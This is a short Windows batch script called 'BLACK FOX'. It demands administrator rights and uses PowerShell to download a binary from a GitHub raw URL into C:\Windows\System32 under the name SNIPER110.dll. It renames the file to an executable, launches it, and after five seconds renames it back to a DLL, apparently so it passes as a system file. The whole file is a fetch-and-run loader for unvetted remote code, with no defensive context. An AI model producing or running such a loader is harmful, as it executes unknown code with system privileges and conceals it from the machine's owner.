@echo off
setlocal enabledelayedexpansion

echo BLACK FOX

:: Check for Admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] This script must be run as administrator.
    exit /b
)

:: Step 1: Delete old files
if exist "C:\Windows\System32\SNIPER110.dll" del /f /q "C:\Windows\System32\SNIPER110.dll"
if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\BLACK FOX.exe"

:: Step 2: Download new file
powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/BLACK110' -OutFile 'C:\Windows\System32\SNIPER110.dll' -ErrorAction Stop } catch { exit 1 }"
if not exist "C:\Windows\System32\SNIPER110.dll" (
    echo [ERROR] Download failed!
    exit /b
)

:: Step 3: Rename DLL to EXE
ren "C:\Windows\System32\SNIPER110.dll" "BLACK FOX.exe"

:: Step 4: Execute
start "" "C:\Windows\System32\BLACK FOX.exe"

:: Step 5: Wait for 5 seconds
timeout /t 5 /nobreak >nul

:: Step 6: Rename EXE back to DLL
ren "C:\Windows\System32\BLACK FOX.exe" "SNIPER110.dll"

:: Auto-exit
exit
